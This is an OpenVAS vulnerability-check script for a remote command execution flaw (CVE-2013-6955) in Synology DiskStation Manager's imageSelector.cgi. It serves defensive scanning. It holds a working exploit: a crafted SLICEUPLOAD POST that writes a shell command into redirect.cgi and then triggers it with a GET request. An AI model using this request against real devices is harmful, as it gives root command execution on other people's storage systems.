###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_synology_dsm_64516.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Synology DiskStation Manager 'imageSelector.cgi' Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/o:synology:dsm";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103869");
  script_bugtraq_id(64516);
  script_cve_id("CVE-2013-6955");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13994 $");

  script_name("Synology DiskStation Manager 'imageSelector.cgi' Remote Command Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64516");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-01-07 14:57:33 +0100 (Tue, 07 Jan 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_synology_dsm_detect.nasl");
  script_require_ports("Services/www", 80, 5000, 5001);
  script_mandatory_keys("synology_dsm/installed");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary commands with
  root privileges.");

  script_tag(name:"vuldetect", value:"This script tries to execute the 'id' command on the remote host using specially crafted requests.");

  script_tag(name:"insight", value:"Synology DiskStation Manager (DSM) contains a flaw in the
  SliceUpload functionality provided by /webman/imageSelector.cgi. With a specially crafted request, a
  remote attacker can append data to files, allowing for the execution of arbitrary commands.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Synology DiskStation Manager is prone to a remote command-execution
  vulnerability.");

  script_tag(name:"affected", value:"Synology DiskStation Manager 4.x are vulnerable. Other versions may
  also be affected.");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

useragent = http_get_user_agent();
vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
vtstring_lower = vtstrings["lowercase"];

host = http_host_name(port:port);

function send_post_request ( cmd )
{
  local_var req, buf, len, data, boundary;

  boundary = '_' + vtstring + '_' + rand();

  data = '--' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="source"\r\n' +
        '\r\n' +
        'login\r\n' +
        '  --' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="type"\r\n' +
        '\r\n' +
        'logo\r\n' +
        '  --' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="' + vtstring_lower + '"; filename="' + vtstring_lower + '"\r\n' +
        'Content-Type: application/octet-stream\r\n' +
        '\r\n' +
        "sed -i -e '/sed -i -e/,$d' /usr/syno/synoman/redirect.cgi" + '\n' +
        cmd + '\r\n' +
        '  --' + boundary + '--';

  len = strlen( data );

  req = 'POST /webman/imageSelector.cgi HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'X-TYPE-NAME: SLICEUPLOAD\r\n' +
        'X-TMP-FILE: /usr/syno/synoman/redirect.cgi\r\n' +
        'Content-Type: multipart/form-data; boundary=' + boundary + '\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        data;

  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if ( "error_noprivilege" >< buf ) return TRUE;
}

function send_get_request()
{
  local_var req, buf;

  req = 'GET /redirect.cgi HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: 0\r\n\r\n';

  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf )
    return buf;
}

if ( send_post_request( cmd:'id' ) )
{
  buf = send_get_request();
  if ( buf =~ 'uid=[0-9]+.*gid=[0-9]+.*' )
  {
    report = 'It was possible to execute the "id" command on the remote host\nwhich produces the following output:\n\n' + buf;
    security_message( port:port, data:report );
    send_post_request( cmd:'' ); # cleanup
    exit( 0 );
  }
}

exit( 99 );